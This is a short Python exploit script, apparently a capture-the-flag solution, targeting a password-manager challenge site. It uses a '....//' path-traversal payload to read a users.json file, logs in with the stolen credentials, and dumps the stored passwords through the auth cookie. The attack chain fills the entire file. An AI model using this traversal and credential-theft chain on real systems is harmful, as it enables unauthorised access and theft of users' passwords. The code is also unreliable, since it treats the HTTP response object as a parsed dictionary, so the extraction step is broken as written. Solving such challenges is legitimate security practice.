from pwn import *
import requests

def exploit():
    # Target URL
    url = "https://password-manager-web-chal.irisc.tf"
    
    # Path traversal to get users.json
    traversal_path = "....//....//users.json"
    r = requests.get(f"{url}/{traversal_path}")
    
    if r.status_code == 200:
        log.success("[+] Successfully retrieved users.json")
        
        # Get first user credentials
        username, password = list(r.keys())[0], list(r.values())[0]
        
        log.info(f"[+] Found credentials - Username: {username}, Password: {password}")
        
        # Login with found credentials
        auth_data = {
            "usr": username,
            "pwd": password
        }
        
        r = requests.post(f"{url}/login", json=auth_data)
        if r.status_code == 200:
            log.success("[+] Successfully logged in!")
            
            # Get auth cookie
            auth_cookie = r.cookies.get('auth')
            
            # Get passwords
            r = requests.get(f"{url}/getpasswords", 
                           cookies={'auth': auth_cookie})
            
            if r.status_code == 200:
                log.success("[+] Got passwords!")
                print(r.text)
                return True
    
    return False

if __name__ == "__main__":
    try:
        if exploit():
            log.success("[+] Exploit completed successfully!")
        else:
            log.failure("[-] Exploit failed!")
    except Exception as e:
        log.error(f"[-] Error during exploit: {str(e)}")
